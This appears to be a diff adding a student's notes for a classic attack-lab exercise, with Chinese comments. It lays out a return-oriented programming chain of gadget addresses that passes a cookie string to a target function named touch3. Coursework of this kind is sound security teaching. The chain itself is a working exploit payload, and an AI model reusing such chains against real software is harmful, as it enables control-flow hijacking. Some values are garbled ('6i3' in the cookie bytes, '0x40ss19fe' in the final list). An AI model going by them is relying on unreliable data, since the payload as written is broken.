@@ -1,0 +1,31 @@
+- cookie -> char array:
+	0x1f9c03ad - > 31 66 39 63 30 33 61 64
+
+栈顶
+mov  %rsp, %rax 48 89 e0 c3    0x401aa1 getval_347 		# 拿到 rsp 存着的地址
+mov  %rax, %rdi 48 89 c7 c3    0x4019fe setval_193
+pop  %rax       58 c3          0x401a06 getval_176		#(然后把这个地址)+(cookie 在 stack 偏移量)pop到rax寄存器中
+constant 0x48
+movl %eax, %ecx 89 c1 c3 			 0x401a2f setval_487
+movl %ecx, %edx 89 ca c3 			 0x401a6c setval_216
+movl %edx, %esi 89 d6 20 db  	 0x401a9b setval_360 (20 db 没有影响) 
+lea  (%rdi, %rsi, 1), %rax     0x401a1b add_xy
+mov  %rax, %rdi 48 89 c7 c3    0x4019fe setval_193		# 然后把这个寄存器的值放到 rdi 中
+0x401942											 touch3 的地址 					# 然后调用 touch3
+31 66 39 6i3 30 33 61 64			 cookie 的字符串					# cookie 要放到 stack 最后面
+栈底																										# 字符串最后加上 \0 也就是 00000000 来标志结束
+
+
+
+
+0x401aa1
+0x4019fe
+0x401a06
+0x48
+0x401a2f
+0x401a6c
+0x401a9b
+0x401a1b
+0x40ss19fe
+0x401942
+31 66 39 63 30 33 61 64
